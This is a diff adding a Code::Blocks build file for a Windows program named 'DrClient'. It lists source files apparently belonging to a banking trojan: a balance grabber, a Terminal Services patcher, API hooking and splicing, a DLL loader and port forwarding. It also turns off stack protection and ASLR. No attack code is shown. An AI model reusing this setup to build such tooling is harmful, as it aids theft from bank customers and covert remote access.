@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="DrClient" />
+		<Option pch_mode="2" />
+		<Option default_target="Debug EXE" />
+		<Option compiler="microsoft_visual_c_2008" />
+		<Build>
+			<Target title="Debug DLL">
+				<Option output="..\bin\debug\DrClient" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\debug\DrClient\dll" />
+				<Option type="3" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/W3" />
+					<Add option="/Zi" />
+					<Add option="/DWIN32" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_WINDOWS" />
+					<Add option="/D_DLL" />
+				</Compiler>
+				<Linker>
+					<Add option="/DEBUG" />
+					<Add library="ws2_32" />
+					<Add library="winmm" />
+					<Add library="gdiplus" />
+					<Add library="psapi" />
+				</Linker>
+			</Target>
+			<Target title="Release DLL">
+				<Option output="..\bin\release\DrClient" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\release\DrClient\dll" />
+				<Option type="3" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/W3" />
+					<Add option="/DWIN32" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_WINDOWS" />
+					<Add option="/D_DLL" />
+				</Compiler>
+				<Linker>
+					<Add option="/INCREMENTAL:NO" />
+					<Add library="ws2_32" />
+					<Add library="winmm" />
+					<Add library="gdiplus" />
+					<Add library="psapi" />
+				</Linker>
+			</Target>
+			<Target title="Debug EXE">
+				<Option output="..\bin\debug\DrClient" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\debug\DrClient\exe" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/W3" />
+					<Add option="/Zi" />
+					<Add option="/DWIN32" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_WINDOWS" />
+					<Add option="/D_EXE" />
+				</Compiler>
+				<Linker>
+					<Add option="/DEBUG" />
+					<Add library="ws2_32" />
+					<Add library="winmm" />
+					<Add library="gdiplus" />
+					<Add library="psapi" />
+				</Linker>
+			</Target>
+			<Target title="Release EXE">
+				<Option output="..\bin\release\DrClient" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\release\DrClient\exe" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/W3" />
+					<Add option="/DWIN32" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_WINDOWS" />
+					<Add option="/D_EXE" />
+				</Compiler>
+				<Linker>
+					<Add option="/INCREMENTAL:NO" />
+					<Add library="ws2_32" />
+					<Add library="winmm" />
+					<Add library="gdiplus" />
+					<Add library="psapi" />
+				</Linker>
+			</Target>
+		</Build>
+		<VirtualTargets>
+			<Add alias="Debug" targets="Debug DLL;Debug EXE;" />
+			<Add alias="Release" targets="Release DLL;Release EXE;" />
+		</VirtualTargets>
+		<Compiler>
+			<Add option="/MD" />
+			<Add option="/GS-" />
+			<Add option="/FD" />
+			<Add option="/DUNICODE" />
+			<Add option="/D_UNICODE" />
+			<Add directory="D:\dev\VC08\Include" />
+			<Add directory="..\DrClient" />
+		</Compiler>
+		<Linker>
+			<Add option="/DYNAMICBASE:NO" />
+			<Add library="gdiplus" />
+			<Add library="rasapi32" />
+			<Add library="version" />
+			<Add library="urlmon" />
+			<Add library="iphlpapi" />
+		</Linker>
+		<Unit filename="ClientConsole.cpp" />
+		<Unit filename="ClientOps.cpp" />
+		<Unit filename="ClientOps.h" />
+		<Unit filename="DllLoader.cpp" />
+		<Unit filename="DllLoader.h" />
+		<Unit filename="DrClient.def" />
+		<Unit filename="EnumFileInfo.cpp" />
+		<Unit filename="EnumFileInfo.h" />
+		<Unit filename="EnumWindowInfo.cpp" />
+		<Unit filename="EnumWindowInfo.h" />
+		<Unit filename="FileLoader.cpp" />
+		<Unit filename="FileLoader.h" />
+		<Unit filename="GetApi.cpp" />
+		<Unit filename="Hook.cpp" />
+		<Unit filename="Splice.cpp" />
+		<Unit filename="TermSrv_Patch\Load.cpp" />
+		<Unit filename="TermSrv_Patch\Load.h" />
+		<Unit filename="TermSrv_Patch\PatchRegister.cpp" />
+		<Unit filename="TermSrv_Patch\PatchRegister.h" />
+		<Unit filename="TermSrv_Patch\Patcher.cpp" />
+		<Unit filename="TermSrv_Patch\Patcher.h" />
+		<Unit filename="TermSrv_Patch\md5.cpp" />
+		<Unit filename="TermSrv_Patch\md5.h" />
+		<Unit filename="bssofflinebalancegrabber.cpp" />
+		<Unit filename="funk.cpp" />
+		<Unit filename="funk.h" />
+		<Unit filename="portforw.cpp" />
+		<Unit filename="processes.cpp" />
+		<Unit filename="processes.h" />
+		<Unit filename="stdafx.cpp" />
+		<Unit filename="stdafx.h" />
+		<Unit filename="..\common\protocol.cpp" />
+		<Extensions>
+			<code_completion />
+			<envvars />
+			<debugger />
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
